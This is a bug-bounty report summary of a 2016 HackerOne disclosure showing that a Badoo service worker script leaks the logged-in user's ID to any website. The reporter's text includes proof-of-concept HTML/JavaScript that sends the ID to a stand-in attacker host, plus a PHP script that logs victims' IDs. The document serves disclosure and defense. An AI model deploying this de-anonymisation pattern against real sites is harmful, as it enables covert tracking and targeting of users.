# User Identification via Service Worker Script - Privacy Violation

## Metadata
- **Source:** HackerOne
- **Report:** 139192 | https://hackerone.com/reports/139192
- **Submitted:** 2016-05-16
- **Reporter:** saeedhashem
- **Program:** Badoo
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Information Disclosure, Privacy Violation, Cross-Site Request Forgery (CSRF), User Tracking
- **CVEs:** None
- **Category:** web-api

## Summary
A publicly accessible Badoo service worker script containing user-dependent information could be fetched by any website, allowing attackers to identify logged-in users and determine their identity. This enables malicious site owners to collect Badoo user IDs visiting their pages and escalate general advertising campaigns into targeted surveillance campaigns.

## Attack scenario
1. Attacker identifies that https://badoo.com/worker-scope/chrome-service-worker.js?ws=1 contains user-dependent data accessible via cross-origin requests
2. Attacker creates a decoy website or advertisement campaign distributing links across the internet
3. Victim visits attacker's webpage while logged into Badoo
4. Attacker's malicious script loads the Badoo service worker and extracts user ID information
5. Extracted user ID is transmitted to attacker's server via XMLHttpRequest, logging the visitor's identity
6. Attacker accumulates a list of Badoo user IDs and performs targeted harassment, phishing, or manipulation campaigns

## Root cause
The service worker script at /worker-scope/chrome-service-worker.js was not properly protected against cross-origin access and contained user-identifying information in a format accessible to unauthenticated cross-origin requests. The application failed to implement proper CORS policies or authenticate requests before exposing user-dependent data.

## Attacker mindset
A profit-motivated attacker (e.g., competitor, spammer, or malicious advertiser) recognizes an opportunity to convert general website traffic into a targeted user database for manipulation, harassment, or social engineering campaigns without victims' knowledge or consent.

## Defensive takeaways
- Implement strict CORS policies to prevent cross-origin fetching of sensitive resources
- Avoid embedding user-identifying information in publicly accessible URLs or responses
- Require proper authentication and session validation before exposing any user-dependent data
- Use SameSite cookie attributes to prevent cross-site request exploitation
- Implement Content Security Policy (CSP) headers to restrict script execution contexts
- Monitor and log access to sensitive endpoints for anomalous cross-origin requests
- Separate public and authenticated resources with clear access control boundaries

## Variant hunting
Search for other publicly accessible endpoints containing user identifiers in URL parameters or responses
Test service worker and web worker endpoints for user-dependent data leakage
Examine API responses from common paths (/api/, /worker/, /static/) for embedded user information
Look for similar tracking/identification mechanisms in localStorage, sessionStorage, or localStorage accessible cross-origin
Test if user presence detection is possible through timing attacks on authentication endpoints

## MITRE ATT&CK
- T1592 - Gather Victim Identity Information
- T1598 - Phishing: Web Browsing
- T1589 - Gather Victim Identity Information
- T1040 - Network Sniffing
- T1557 - Man-in-the-Middle

## Notes
The reporter clarified this is not about simple user ID disclosure (which would be normal), but rather the ability for any website owner to covertly identify and track Badoo users visiting their pages. This transforms the vulnerability from information disclosure into a privacy violation enabling unauthorized user profiling and targeted manipulation. The attack chain demonstrates how a seemingly minor information leak can be weaponized for large-scale user surveillance.

## Full report
<details><summary>Expand</summary>

Hey ,

Regarding this report #130453 , I'm pretty sure that there's a little misunderstanding of the issue , so please let me clarify the issue a bit more .

The issue is not about the disclosure of user's id , that wouldn't be considered an issue at all because every website puts user's id in the user's profile usually , The issue here is the disclosure of badoo user who visited the webpage which contained the exploit code , that allows any site owner or advertisement campaign designer to exploit this issue maliciously by escalating a public and general ads campaign to a targeted ads campaign after collecting the users who were interested in the general campaign .  

Let's clarify a bit further by some details and exploit scenario .

###What made the vulnerability appear ?

1. This script `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` being contained information dependent on the currently logged in user .
2. This information can identify the currently logged in user.
3. The same script being public , and can be called and fetched by any rogue script on any website  .


###What makes it an issue ?

It's considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .

Additionally the issue allows any one to figure out weather I'm logged in or logged out , and by which account .

###How can any one exploit the issue maliciously ? 

Let's consider the following as an exploit scenario .

I'm a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .

So , I designed a plan as following :

1. Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .
2. The new product page should contain the Exploit code written below .

```
<html>
<script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function UnmaskUser(str) {
return str.split('=')[0];
}
window.onload = function(){
var user = UnmaskUser(user_id);
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' user , true);
xhr.send();
};
</script>
</html>
```
And the `identity-stealer.php` should have the code :
```
<?php
$user = $_GET['victim'];
$fd = fopen("badoo-users-interested-in-my-product.txt","a");
 fwrite($fd, $user);
 fclose($fd);
?>
```

3. The people who may be interested in my new product will start to visit my new product page .
4. After a period of time I will be having a txt file `badoo-users-interested-in-my-product.txt` on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .
5. Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .


##Note : 
This should be clarified the matter , so if you still think this issue isn't considered a security issue or privacy violation you can close the report as informative .


Best regards , 
Thanks ,

Saeed H. 

</details>

---
*Analysed by Claude on 2026-05-24*
